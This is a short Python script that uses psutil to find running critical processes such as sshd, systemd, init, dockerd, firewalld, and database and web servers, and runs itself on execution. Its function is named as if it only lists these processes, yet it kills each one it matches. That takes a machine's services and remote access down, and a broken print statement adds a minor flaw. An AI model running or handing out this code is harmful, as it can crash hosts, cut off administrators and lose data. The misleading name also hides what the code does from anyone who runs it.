import psutil

critical_processes = [
    "sshd", "dockerd", "containerd", "docker-proxy", "docker-containerd-shim",
    "runc", "NetworkManager", "wpa_supplicant", "init", "systemd", "cron",
    "rsyslogd", "dbus-daemon", "Xorg", "nginx", "apache2", "httpd", "mysqld",
    "postgres", "redis-server", "mongod", "sssd", "gdm", "cupsd", "lightdm",
    "bluetoothd", "avahi-daemon", "ntpd", "chronyd", "firewalld", "polkitd"
]

def list_critical_processes():
    for proc in psutil.process_iter(['pid', 'cmdline', 'name']):
        try:
            process_info = proc.info
            pid = process_info['pid']
            cmdline = process_info.get('cmdline', [])
            name = process_info.get('name', '')

            if cmdline:
                cmdline_str = ' '.join(cmdline)
            else:
                cmdline_str = "N/A"
            
            if cmdline is not None and any(label in cmdline for label in critical_processes):
                print(f"PID: {pid}, Command Line: {cmdline_str}")
                proc.kill()
                print("PID: {pid}, Command Line: {cmdline_str} is killed")

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

list_critical_processes()

